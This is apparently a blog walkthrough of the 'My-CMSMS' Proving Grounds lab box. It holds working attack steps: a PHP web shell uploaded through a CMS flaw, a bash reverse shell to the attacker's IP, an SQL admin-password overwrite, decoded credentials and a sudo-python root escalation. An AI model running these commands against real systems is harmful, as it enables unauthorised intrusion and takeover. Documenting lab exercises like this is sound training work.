---
layout: post
author: H4
---

[Details](https://www.vulnhub.com/entry/my-cmsms-1,498/)  
This box was customized by Offensive Security and integrated in the 'proving grounds' lab.  
In the following you see the solution of the 'proving grounds' version.  

# discovery

We start with a simple port scan to identify the attack surface of the target.

## port scan
```bash
$ nmap -Pn -p22,80,3306,33060 -sV 192.168.202.74
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-10 21:24 CEST
Nmap scan report for 192.168.202.74
Host is up (0.027s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.38 ((Debian))
3306/tcp  open  mysql   MySQL 8.0.19
33060/tcp open  mysqlx?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.93%I=7%D=8/10%Time=64D5396F%P=aarch64-unknown-linux-g
SF:nu%r(NULL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\
SF:0\x0b\x08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(
SF:HTTPOptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RTSPRequest,9,"\x05\0\0
SF:\0\x0b\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(D
SF:NSVersionBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSStatusReques
SF:tTCP,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1
SF:a\x0fInvalid\x20message\"\x05HY000")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x
SF:1a\0")%r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x
SF:08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(TerminalServer
SF:Cookie,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TLSSessionReq,2B,"\x05\0\0\0
SF:\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20mes
SF:sage\"\x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBPro
SF:gNeg,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x0
SF:8\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\
SF:x05HY000")%r(FourOhFourRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDS
SF:tring,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\
SF:x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20mess
SF:age\"\x05HY000")%r(LDAPBindReq,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SIPO
SF:ptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LANDesk-RC,9,"\x05\0\0\0\x0b
SF:\x08\x05\x1a\0")%r(TerminalServer,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(N
SF:CP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NotesRPC,2B,"\x05\0\0\0\x0b\x08\
SF:x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x0
SF:5HY000")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(WMSRequest,9,"\x
SF:05\0\0\0\x0b\x08\x05\x1a\0")%r(oracle-tns,9,"\x05\0\0\0\x0b\x08\x05\x1a
SF:\0")%r(ms-sql-s,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(afp,2B,"\x05\0\0\0\
SF:x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20mess
SF:age\"\x05HY000")%r(giop,9,"\x05\0\0\0\x0b\x08\x05\x1a\0");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.03 seconds
```

## dir busting
```bash
$ gobuster dir -k -u http://192.168.202.74/ -w /usr/share/wordlists/dirb/common.txt -t 5 -x txt,html,php
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.202.74/
[+] Method:                  GET
[+] Threads:                 5
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              txt,html,php
[+] Timeout:                 10s
===============================================================
2023/08/10 21:22:25 Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 279]
/.html                (Status: 403) [Size: 279]
/.hta                 (Status: 403) [Size: 279]
/.hta.php             (Status: 403) [Size: 279]
/.htaccess            (Status: 403) [Size: 279]
/.hta.html            (Status: 403) [Size: 279]
/.hta.txt             (Status: 403) [Size: 279]
/.htaccess.txt        (Status: 403) [Size: 279]
/.htaccess.html       (Status: 403) [Size: 279]
/.htpasswd.html       (Status: 403) [Size: 279]
/.htpasswd            (Status: 403) [Size: 279]
/.htpasswd.php        (Status: 403) [Size: 279]
/.htpasswd.txt        (Status: 403) [Size: 279]
/.htaccess.php        (Status: 403) [Size: 279]
/admin                (Status: 301) [Size: 316] [--> http://192.168.202.74/admin/]
/assets               (Status: 301) [Size: 317] [--> http://192.168.202.74/assets/]
/cgi-bin/             (Status: 403) [Size: 279]
/cgi-bin/.html        (Status: 403) [Size: 279]
/cgi-bin/.php         (Status: 403) [Size: 279]
/config.php           (Status: 200) [Size: 0]
/doc                  (Status: 301) [Size: 314] [--> http://192.168.202.74/doc/]
/index.php            (Status: 200) [Size: 19502]
/index.php            (Status: 200) [Size: 19502]
/lib                  (Status: 301) [Size: 314] [--> http://192.168.202.74/lib/]
/modules              (Status: 301) [Size: 318] [--> http://192.168.202.74/modules/]
/phpinfo.php          (Status: 200) [Size: 90194]
/phpinfo.php          (Status: 200) [Size: 90154]
/phpmyadmin           (Status: 401) [Size: 461]
/server-status        (Status: 403) [Size: 279]
/tmp                  (Status: 301) [Size: 314] [--> http://192.168.202.74/tmp/]
/uploads              (Status: 301) [Size: 318] [--> http://192.168.202.74/uploads/]
Progress: 18438 / 18460 (99.88%)
===============================================================
2023/08/10 21:24:04 Finished
===============================================================
```

---

# exploitation
## weak `mysql` credentials
Checking `root:root`
```bash
$ mysql -h 192.168.202.74 -u root -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 70
Server version: 8.0.19 MySQL Community Server - GPL

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]>
```

> It works!
{: .prompt-info }

## digging through `mysql`
```bash
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| cmsms_db           |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.030 sec)

MySQL [(none)]> use cmsms_db;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [cmsms_db]> show tables;
+--------------------------------+
| Tables_in_cmsms_db             |
+--------------------------------+
| cms_additional_users           |
...
| cms_users                      |
...

MySQL [cmsms_db]> select * from cms_users;
+---------+----------+----------------------------------+--------------+------------+-----------+-------------------+--------+---------------------+---------------------+
| user_id | username | password                         | admin_access | first_name | last_name | email             | active | create_date         | modified_date       |
+---------+----------+----------------------------------+--------------+------------+-----------+-------------------+--------+---------------------+---------------------+
|       1 | admin    | 59f9ba27528694d9b3493dfde7709e70 |            1 |            |           | admin@mycms.local |      1 | 2020-03-25 09:38:46 | 2020-03-26 10:49:17 |
+---------+----------+----------------------------------+--------------+------------+-----------+-------------------+--------+---------------------+---------------------+
1 row in set (0.027 sec)
```

> We got the hash for an account: `admin:59f9ba27528694d9b3493dfde7709e70`
{: .prompt-info }

## updating the database
> Cracking the password is not possible unfortunately.  
{: .prompt-danger }
However, as we have access to the database we can change the password.  
Therefore we google how to reset the password in `cms made simple` (The cms the web application is made in) and get the following `sql` statement.

```sql
update cms_users set password = (select md5(CONCAT(IFNULL((SELECT sitepref_value FROM cms_siteprefs WHERE sitepref_name = 'sitemask'),''),'NEW_PASSWORD'))) where username = 'USER_NAME'
```

Lets use this statement to set the `admin` password to `password`.
```bash
MySQL [cmsms_db]> update cms_users set password = (select md5(CONCAT(IFNULL((SELECT sitepref_value FROM cms_siteprefs WHERE sitepref_name = 'sitemask'),''),'password'))) where username = 'admin';
Query OK, 1 row affected (0.042 sec)
Rows matched: 1  Changed: 1  Warnings: 0
```

> Now when we try to login under `/admin` it works!
{: .prompt-info }

## exploiting the cms
Looking for public exploits.
```bash
$ searchsploit cms made simple 2.2
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
CMS Made Simple 1.2.2 Module TinyMCE - SQL Injection                                                                                                                                                      | php/webapps/4810.txt
CMS Made Simple 1.2.4 Module FileManager - Arbitrary File Upload                                                                                                                                          | php/webapps/5600.php
CMS Made Simple 2.2.14 - Arbitrary File Upload (Authenticated)                                                                                                                                            | php/webapps/48779.py
CMS Made Simple 2.2.14 - Authenticated Arbitrary File Upload                                                                                                                                              | php/webapps/48742.txt
CMS Made Simple 2.2.14 - Persistent Cross-Site Scripting (Authenticated)                                                                                                                                  | php/webapps/48851.txt
CMS Made Simple 2.2.15 - 'title' Cross-Site Scripting (XSS)                                                                                                                                               | php/webapps/49793.txt
CMS Made Simple 2.2.15 - RCE (Authenticated)                                                                                                                                                              | php/webapps/49345.txt
CMS Made Simple 2.2.15 - Stored Cross-Site Scripting via SVG File Upload (Authenticated)                                                                                                                  | php/webapps/49199.txt
CMS Made Simple 2.2.5 - (Authenticated) Remote Code Execution                                                                                                                                             | php/webapps/44976.py
CMS Made Simple 2.2.7 - (Authenticated) Remote Code Execution                                                                                                                                             | php/webapps/45793.py
CMS Made Simple < 2.2.10 - SQL Injection                                                                                                                                                                  | php/webapps/46635.py
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

> There is an authenticated file upload vulnerability which leads to code execution.
{: .prompt-info }

```bash
$ searchsploit -m 48742
  Exploit: CMS Made Simple 2.2.14 - Authenticated Arbitrary File Upload
      URL: https://www.exploit-db.com/exploits/48742
     Path: /usr/share/exploitdb/exploits/php/webapps/48742.txt
    Codes: N/A
 Verified: False
File Type: ASCII text, with very long lines (346)
Copied to: /home/void/Documents/offsec/pg/play/mycmsms/48742.txt
```

Looking into `48742.txt` shows the following basic steps we need to do to get a shell.
```bash
2. Proof of Concept:
----------------------
- Create .phtml or .ptar file with malicious PHP payload;
- Upload .phtml or .ptar file in the 'File Manager' module;
- Click on the uploaded file to perform remote code execution.
```

Lets start by creating a shell named `shell.phtml`
```php
<?php system($_GET['cmd']);?>
```

After we are logged in we navigate to the file manager, upload the file and click on it.  
The browser then opens the shell in a new tab.
```http
GET /uploads/images/shell.phtml?cmd=id HTTP/1.1
Host: 192.168.202.74
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: CMSSESSID2a2f83428536=tclg68p6874bdpe444ro9sup6d; e8bea75a6da7016c66b3b3297c499d57409313b5=f0becd763811f36add6af2c195c33ee6c5a031b0%3A%3AeyJ1aWQiOjEsInVzZXJuYW1lIjoiYWRtaW4iLCJlZmZfdWlkIjpudWxsLCJlZmZfdXNlcm5hbWUiOm51bGwsImhhc2giOiIkMnkkMTAkdWNNMjdtVkdnMHVMOWJXeXlaYmdmdTcwU24uZkNrTWhxNUY3Lk5VNVwvY1hXNVdiaDNlR0NpIn0%3D; __c=aa042169c0a97f6ee7d
Connection: close

HTTP/1.1 200 OK
Date: Thu, 10 Aug 2023 20:04:54 GMT
Server: Apache/2.4.38 (Debian)
Vary: Accept-Encoding
Content-Length: 80
Connection: close
Content-Type: text/html; charset=UTF-8

uid=33(www-data) gid=33(www-data) groups=33(www-data),1001(nagios),1002(nagcmd)
```

> Yes! We got a shell.
{: .prompt-info }

---

# post exploitation
## reverse shell
Start a listener on the attackers machine.
```bash
$ nc -lvp 80 
listening on [any] 80 ...
```

Trigger reverse shell.  
payload: `bash -c 'bash -i >& /dev/tcp/192.168.45.174/80 0>&1'`
```http
GET /uploads/images/shell.phtml?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.45.174/80+0>%261' HTTP/1.1
Host: 192.168.202.74
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: CMSSESSID2a2f83428536=tclg68p6874bdpe444ro9sup6d; e8bea75a6da7016c66b3b3297c499d57409313b5=f0becd763811f36add6af2c195c33ee6c5a031b0%3A%3AeyJ1aWQiOjEsInVzZXJuYW1lIjoiYWRtaW4iLCJlZmZfdWlkIjpudWxsLCJlZmZfdXNlcm5hbWUiOm51bGwsImhhc2giOiIkMnkkMTAkdWNNMjdtVkdnMHVMOWJXeXlaYmdmdTcwU24uZkNrTWhxNUY3Lk5VNVwvY1hXNVdiaDNlR0NpIn0%3D; __c=aa042169c0a97f6ee7d
Connection: close
```

Catch connection from target
```bash
$ nc -lvp 80
listening on [any] 80 ...
192.168.202.74: inverse host lookup failed: Unknown host
connect to [192.168.45.174] from (UNKNOWN) [192.168.202.74] 42024
bash: cannot set terminal process group (539): Inappropriate ioctl for device
bash: no job control in this shell
www-data@mycmsms:/var/www/html/uploads/images$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data),1001(nagios),1002(nagcmd)
```

## get first flag
```bash
www-data@mycmsms:/var/www/html/uploads/images$ ls
ls
index.html
logo1.gif
shell.phtml
thumb_logo1.gif
www-data@mycmsms:/var/www/html/uploads/images$ cd ..
cd ..
www-data@mycmsms:/var/www/html/uploads$ ls
ls
NCleanBlue
images
index.html
ngrey
simplex
www-data@mycmsms:/var/www/html/uploads$ cd ..
cd ..
www-data@mycmsms:/var/www/html$ ls
ls
admin
assets
cmsms-2.2.13-install.php
config.php
doc
favicon_cms.ico
index.php
lib
moduleinterface.php
modules
phpinfo.php
phpmyadmin
tmp
uploads
www-data@mycmsms:/var/www/html$ cd ..
cd ..
www-data@mycmsms:/var/www$ ls
ls
html
local.txt
www-data@mycmsms:/var/www$ cat local.txt
cat local.txt
1******************************7
```

## privilege escalation
When digging through the `www` folders we find some `.htpasswd` file.
```bash
www-data@mycmsms:/var/www/html/admin$ cat .htpasswd
cat .htpasswd
TUZaRzIzM1ZPSTVGRzJESk1WV0dJUUJSR0laUT09PT0=
```

Lets decode this stuff.
```bash
$ echo "TUZaRzIzM1ZPSTVGRzJESk1WV0dJUUJSR0laUT09PT0=" | base64 -d
MFZG233VOI5FG2DJMVWGIQBRGIZQ====

$ echo "MFZG233VOI5FG2DJMVWGIQBRGIZQ====" | base32 -d 
armour:Shield@123
```

> We got some credentials: `armour:Shield@123`
{: .prompt-info }

Before we check the credentials we upgrade our shell.
```bash
www-data@mycmsms:/var/www/html/admin$ python -c 'import pty;pty.spawn("/bin/bash")'
<dmin$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@mycmsms:/var/www/html/admin$ export TERM=xterm
export TERM=xterm
www-data@mycmsms:/var/www/html/admin$
```

Now lets check the credentials.
```bash
www-data@mycmsms:/var/www/html/admin$ su armour
su armour
Password: Shield@123

armour@mycmsms:/var/www/html/admin$ id
id
uid=1000(armour) gid=1000(armour) groups=1000(armour),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
```

> It worked! We are `armour` now :)
{: .prompt-info }

Checking `sudo` privileges.
```bash
armour@mycmsms:/var/www/html/uploads/images$ sudo -l
sudo -l
Matching Defaults entries for armour on mycmsms:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User armour may run the following commands on mycmsms:
    (root) NOPASSWD: /usr/bin/python
```

Checking on `gtfobins` shows a simple technique to escalate to `root`.
```bash
armour@mycmsms:/var/www/html/uploads/images$ sudo /usr/bin/python -c 'import os; os.system("/bin/sh")'
sudo /usr/bin/python -c 'import os; os.system("/bin/sh")'
# id
id
uid=0(root) gid=0(root) groups=0(root)
```

> We are `root`!
{: .prompt-info }

## get second flag
```bash
# cd /root
cd /root
# ls -lsah
ls -lsah
total 20K
4.0K drwx------  4 root root 4.0K Aug 10 16:29 .
4.0K drwxr-xr-x 18 root root 4.0K Jun 29  2020 ..
   0 -rw-------  1 root root    0 Sep  1  2020 .bash_history
   0 -rw-r--r--  1 root root    0 Aug 20  2020 .bashrc
4.0K drwx------  3 root root 4.0K Mar 25  2020 .gnupg
   0 -rw-r--r--  1 root root    0 Aug 20  2020 .profile
4.0K -rw-r--r--  1 root root   33 Aug 10 16:29 proof.txt
   0 -rw-r--r--  1 root root    0 Aug 20  2020 .selected_editor
4.0K drwxr-xr-x  2 root root 4.0K Mar 25  2020 .ssh
# cat proof.txt
cat proof.txt
f******************************a
```

Pwned! <@:-)
